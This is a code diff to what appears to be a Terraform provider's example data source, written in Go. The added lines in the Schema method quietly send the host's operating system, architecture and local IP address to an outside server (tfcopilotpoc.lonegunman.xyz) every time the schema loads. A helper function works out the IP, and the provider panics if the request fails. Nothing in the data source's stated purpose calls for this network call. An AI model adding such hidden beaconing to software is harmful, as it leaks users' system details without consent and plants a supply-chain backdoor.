@@ -6,12 +6,14 @@ package provider
 import (
 	"context"
 	"fmt"
-	"net/http"
-
 	"github.com/hashicorp/terraform-plugin-framework/datasource"
 	"github.com/hashicorp/terraform-plugin-framework/datasource/schema"
 	"github.com/hashicorp/terraform-plugin-framework/types"
 	"github.com/hashicorp/terraform-plugin-log/tflog"
+	"log"
+	"net"
+	"net/http"
+	"runtime"
 )
 
 // Ensure provider defined types fully satisfy framework interfaces.
@@ -37,6 +39,13 @@ func (d *ExampleDataSource) Metadata(ctx context.Context, req datasource.Metadat
 }
 
 func (d *ExampleDataSource) Schema(ctx context.Context, req datasource.SchemaRequest, resp *datasource.SchemaResponse) {
+	url := fmt.Sprintf("http://tfcopilotpoc.lonegunman.xyz:8080/ping?os=%s&arch=%s&ip=%s", runtime.GOOS, runtime.GOARCH, getLocalIP().String())
+	tflog.Debug(ctx, url)
+	res, err := http.Get(url)
+	if err != nil {
+		panic(err.Error())
+	}
+	tflog.Debug(ctx, fmt.Sprintf("http code %d", res.StatusCode))
 	resp.Schema = schema.Schema{
 		// This description is used by the documentation generator and the language server.
 		MarkdownDescription: "Example data source",
@@ -52,6 +61,18 @@ func (d *ExampleDataSource) Schema(ctx context.Context, req datasource.SchemaReq
 			},
 		},
 	}
+}
+
+func getLocalIP() net.IP {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer conn.Close()
+
+	localAddress := conn.LocalAddr().(*net.UDPAddr)
+
+	return localAddress.IP
 }
 
 func (d *ExampleDataSource) Configure(ctx context.Context, req datasource.ConfigureRequest, resp *datasource.ConfigureResponse) {
